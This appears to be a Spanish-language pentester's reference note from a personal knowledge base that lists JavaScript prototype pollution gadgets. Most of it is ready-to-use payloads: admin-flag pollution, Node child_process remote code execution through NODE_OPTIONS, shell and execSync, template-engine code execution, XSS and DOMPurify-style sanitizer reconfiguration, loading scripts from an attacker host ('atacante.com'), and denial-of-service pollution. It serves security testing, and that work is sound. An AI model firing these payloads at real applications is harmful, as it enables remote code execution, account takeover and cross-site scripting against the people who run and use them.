---
tipo: meta
aliases:
  - gadgets de prototype pollution
  - NODE_OPTIONS gadget
tags:
  - meta/referencia
  - dominio/web
---

# Prototype pollution gadgets - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué propiedad contaminar para conseguir algo, una vez confirmada la contaminación en [[Prototype pollution - matriz de identificación]]. El criterio está en [[MOC - Prototype pollution]].

Un gadget es un lugar del código que **lee una propiedad que normalmente no existe** y hace algo con ella. Contaminar sin gadget no es un hallazgo explotable, y encontrar el gadget es la mitad cara del dominio.

## 1. Propiedades genéricas — probar siempre primero

No necesitan ninguna biblioteca: dependen de que la aplicación consulte una bandera opcional.

```json
{"__proto__":{"esAdmin":true}}
{"__proto__":{"isAdmin":true}}
{"__proto__":{"admin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"rol":"admin"}}
{"__proto__":{"authenticated":true}}
{"__proto__":{"verified":true}}
{"__proto__":{"canEdit":true}}
{"__proto__":{"isPremium":true}}
{"__proto__":{"skipValidation":true}}
{"__proto__":{"debug":true}}
```

La lista es la misma que la de [[Control de acceso - matriz de pruebas]], porque el objetivo es el mismo campo por otro camino. Ver [[Prototype pollution - propiedad que gobierna una decisión]].

Recordar la regla: **solo funciona si la propiedad no está definida en el objeto**. Un campo que siempre viene de la base de datos gana sobre el prototipo.

## 2. Servidor — ejecución por `child_process`

La familia de mayor impacto. Requiere que la aplicación cree algún proceso hijo, por cualquier motivo.

```json
{"__proto__":{"shell":"/bin/sh","argv0":"curl mi-host","NODE_OPTIONS":"--inspect=mi-host:9229"}}
```

**`NODE_OPTIONS` con `--require`** es la más limpia: hace que cualquier proceso hijo de Node cargue un archivo antes de arrancar.

```json
{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/environ"},"NODE_DEBUG":"console.log(require('child_process').execSync('id').toString())//"}}
```

El truco de `/proc/self/environ` evita necesitar escritura en disco: se pone el código en una variable de entorno y se hace que Node cargue el propio archivo de entorno como módulo. Necesita un `NODE_DEBUG` que termine en `//` para que el resto del contenido binario quede comentado.

**`shell`** cambia el intérprete que usa `spawn`:

```json
{"__proto__":{"shell":"node","NODE_OPTIONS":"--eval=require('child_process').execSync('id')"}}
```

| Propiedad | Qué hace |
|---|---|
| `shell` | Cambia el intérprete de `spawn`/`exec` |
| `NODE_OPTIONS` | Opciones para procesos hijo de Node. `--require`, `--eval`, `--inspect` |
| `env` | Entorno completo del hijo |
| `argv0` | El nombre con que arranca |
| `execPath` | El binario que se ejecuta |
| `cwd` | Directorio de trabajo, útil para rutas relativas |

## 3. Servidor — motores de plantilla

Varios compilan la plantilla concatenando cadenas que salen de un objeto de opciones. Contaminar la que aporta el prólogo del código generado da ejecución en el siguiente renderizado.

```json
{"__proto__":{"client":1,"escapeFunction":"function(){return process.mainModule.require('child_process').execSync('id')}"}}
```

```json
{"__proto__":{"outputFunctionName":"x;return process.mainModule.require('child_process').execSync('id');//"}}
```

Es el mismo efecto que [[SSTI - ejecución directa]] por otro camino, y por eso conviene revisar los dos dominios cuando la pila es Node con plantillas.

## 4. Servidor — Express y su ecosistema

Además de los de confirmación de la matriz de identificación, sirven para impacto:

```json
{"__proto__":{"status":510}}
{"__proto__":{"json spaces":10}}
{"__proto__":{"exposedHeaders":["x"]}}
{"__proto__":{"body":"contenido inyectado"}}
{"__proto__":{"index":["index.js"]}}
{"__proto__":{"root":"/"}}
```

`root` contaminado en un servidor de archivos estáticos convierte el dominio en [[Path traversal]]: la raíz desde la que se sirven archivos pasa a ser la que el atacante eligió.

## 5. Cliente — bibliotecas que construyen HTML

```
?__proto__[src]=data:,alert(1)
?__proto__[url]=data:,alert(1)
?__proto__[href]=javascript:alert(1)
?__proto__[onerror]=alert(1)
?__proto__[srcdoc]=<script>alert(1)</script>
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[template]=<script>alert(1)</script>
```

El payload final es de XSS, así que las evasiones de [[XSS evasión - matriz de referencia]] aplican igual. Ver [[Prototype pollution - gadget del lado del cliente]].

## 6. Cliente — configuración del sanitizador

El caso más elegante del dominio: no se evade el sanitizador, se le cambia lo que considera seguro.

```
?__proto__[ALLOWED_TAGS][]=script
?__proto__[ALLOWED_ATTR][]=onerror
?__proto__[ADD_TAGS][]=script
?__proto__[SAFE_FOR_TEMPLATES]=false
?__proto__[WHOLE_DOCUMENT]=true
```

Después se manda un payload de XSS común, que ahora pasa. La biblioteca sigue funcionando bien; lo que cambió es su configuración.

## 7. Cliente — carga de recursos

La que rinde contra una política de seguridad de contenido estricta, porque la carga la hace la propia aplicación desde su propio origen:

```
?__proto__[baseURI]=https://atacante.com
?__proto__[scriptSrc]=https://atacante.com/x.js
?__proto__[importmap]=...
?__proto__[nonce]=...
```

Contaminar `nonce` merece mención aparte: si la política usa nonce y la aplicación construye elementos leyendo esa propiedad, el atacante puede fijar un nonce conocido y **hacer que su script sea autorizado**.

## 8. Denegación de servicio

Bajo impacto y alto riesgo de romper cosas. Conviene mencionarlo en el informe y no ejecutarlo:

```json
{"__proto__":{"toString":{}}}
{"__proto__":{"length":0}}
{"__proto__":{"hasOwnProperty":null}}
```

Contaminar `toString` rompe prácticamente todo el proceso. No se prueba en producción.

## 9. Orden de trabajo

1. Confirmar la contaminación con un nombre inventado — [[Prototype pollution - matriz de identificación]].
2. Probar el lote genérico de § 1. Es barato y resuelve seguido.
3. Averiguar la pila: qué marco de trabajo, qué motor de plantillas, qué bibliotecas del lado del cliente.
4. Probar los gadget que correspondan a esa pila, no todos.
5. Si nada rinde, reportar la contaminación con lo que se pudo demostrar. **Es un hallazgo válido sin RCE.**

Fijar presupuesto en el paso 4. Es donde se va la tarde, igual que en [[SSTI - escape del entorno restringido]].

## 10. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| Contamina y ningún gadget funciona | La pila no tiene gadget conocido. Resultado legítimo |
| El gadget funciona en la consola y no en la petición | Contaminaste el cliente, no el servidor. Son dos dominios |
| La aplicación empieza a fallar en general | Contaminaste algo estructural. Reiniciar el proceso |
| El gadget de `NODE_OPTIONS` no dispara | La aplicación no crea procesos hijo. Buscar un endpoint que sí |
| Funciona intermitentemente | Varios procesos. La contaminación quedó en uno solo |
| El sanitizador sigue bloqueando | La configuración se pasa explícita en cada llamada. El gadget no aplica |
| `data:` bloqueado en el `src` | La política de contenido lo prohíbe. Ir a § 7 |

## Relacionadas

[[MOC - Prototype pollution]] · [[Prototype pollution - matriz de identificación]] · [[Deserialización gadgets - matriz de referencia]] · [[XSS evasión - matriz de referencia]] · [[Control de acceso - matriz de pruebas]]
